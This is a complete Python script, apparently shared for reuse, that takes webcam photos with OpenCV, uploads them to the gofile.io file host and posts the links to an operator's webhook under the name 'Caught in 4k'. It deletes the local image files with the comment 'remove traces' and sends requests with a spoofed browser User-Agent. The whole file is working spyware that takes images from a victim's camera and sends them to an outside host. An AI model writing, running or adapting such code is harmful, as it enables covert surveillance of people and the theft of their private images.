import os, cv2, requests
from urllib.request import Request, urlopen
from json import dumps

webhook_url = "YOUR_WEBHOOK_HERE" #your webhook url
avatar_url = "https://imgur.com/QVCVjM4" #image link for your webhook

headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
}
Error = {					# Error message that gets sent to webhook
	"content": "Failed to Take/Send Screenshot",
	"username": "Caught in 4k",
	"avatar_url": avatar_url
}
def main():
	cam = cv2.VideoCapture(0)
	cv2.namedWindow("test") #name of window to capture the webcam
	img_counter = 0
	for i in range(2): #change this from 2 to 5 for example if you want it to take 5 pictures
		try:
			ret, frame = cam.read()
			if not ret:
				urlopen(Request(webhook_url, data=dumps(Error).encode(), headers=headers))
			cv2.imshow("test", frame)
			img_name = "Screenshot_{}.jpg".format(img_counter) #you can change the name of the screenshot image here (don't remove the {})
			cv2.imwrite(img_name, frame)
			try:
				screenshotRaw = requests.post('https://srv-store2.gofile.io/uploadFile', files={'file': (f'{os.getcwd()}\\{img_name}', open(f'{os.getcwd()}\\{img_name}', 'rb')),}).text #upload the image
				screenshotUploaded = f"[Screenshot]({screenshotRaw[87:113]})" #text that gets sent to webhook and the link to image
			except:
				screenshotUploaded = "Screenshot: N/A" #change it to N/A if it failed to upload
				pass
			img_counter += 1 
			os.remove(f'{os.getcwd()}\\{img_name}') #remove traces
		except:
			pass
	send(screenshotUploaded) #send to webhook
	cam.release()
	cv2.destroyAllWindows()
def send(screenshotUploaded):
	embeds = []
	embed = {
		"color": 5023308,
		"description": f"{screenshotUploaded}",
		"author": {
			"name": "Screenshot",
			"icon_url": avatar_url
		},
	}
	embeds.append(embed)
	webhook = {
		"content": "@everyone", #remove the @everyone if you don't want it to ping
		"embeds": embeds,
		"username": "Caught in 4k", #change the name to whatever you want
		"avatar_url": avatar_url
	}
	try:
		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=headers))
	except:
		urlopen(Request(webhook_url, data=dumps(Error).encode(), headers=headers))
		pass
if __name__ == "__main__":
	main()
